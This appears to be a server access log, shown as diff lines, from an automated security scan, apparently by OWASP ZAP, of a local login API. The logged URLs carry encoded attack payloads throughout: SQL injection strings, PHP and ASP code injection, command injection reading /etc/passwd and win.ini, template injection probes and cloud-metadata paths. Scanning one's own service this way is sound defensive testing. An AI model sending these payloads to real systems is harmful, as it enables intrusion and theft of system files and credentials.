+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=ZAP HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=%27 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%27 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=%22 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%22 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=%3B HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%3B HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=%27%28 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%27%28 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=ZAP HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=ZAP+AND+1%3D1+--+ HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP+AND+1%3D2+--+ HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=ZAP+OR+1%3D1+--+ HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=ZAP%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=ZAP+UNION+ALL+select+NULL+--+ HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=ZAP%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=ZAP%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=ZAP HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=%22%2Bresponse.write%28742%2C304*926%2C045%29%2B%22&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=response.write%28742%2C304*926%2C045%29&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=%22%2Bresponse.write%28532%2C089*831%2C975%29%2B%22 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=response.write%28532%2C089*831%2C975%29 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=cat+%2Fetc%2Fpasswd&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username%26cat+%2Fetc%2Fpasswd%26&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username%3Bcat+%2Fetc%2Fpasswd%3B&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username%22%26cat+%2Fetc%2Fpasswd%26%22&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username%22%3Bcat+%2Fetc%2Fpasswd%3B%22&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username%27%26cat+%2Fetc%2Fpasswd%26%27&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username%27%3Bcat+%2Fetc%2Fpasswd%3B%27&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=type+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username%26type+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=get-help&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username%3Bget-help&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username%22%3Bget-help&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username%27%3Bget-help&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username%3Bget-help+%23&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=cat+%2Fetc%2Fpasswd HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=ZAP%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=ZAP%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=ZAP%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=ZAP%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=ZAP%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=get-help HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=ZAP%3Bget-help HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%22%3Bget-help HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=ZAP%27%3Bget-help HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP%3Bget-help+%23 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=%22%27&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=%3C%21--&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=%5D%5D%3E&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=%22%27 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=%3C%21-- HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=%5D%5D%3E HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "POST /latest/meta-data/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "POST /latest/meta-data/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /computeMetadata/v1/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "POST /computeMetadata/v1/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=zj+9347*4571+zj&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /opc/v1/instance/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "POST /opc/v1/instance/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=zj%7B1772*3903%7Dzj&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /opc/v2/instance/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=zj%24%7B3143*7271%7Dzj&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /opc/v2/instance/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=zj%23%7B2954*5524%7Dzj&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "POST /latest/meta-data/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "POST /latest/meta-data/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=zj%7B%231897*7352%7Dzj&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /metadata/instance HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=zj%7B%404777*9529%7Dzj&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "POST /metadata/v1 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=zj%7B%7B5028*1443%7D%7Dzj&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
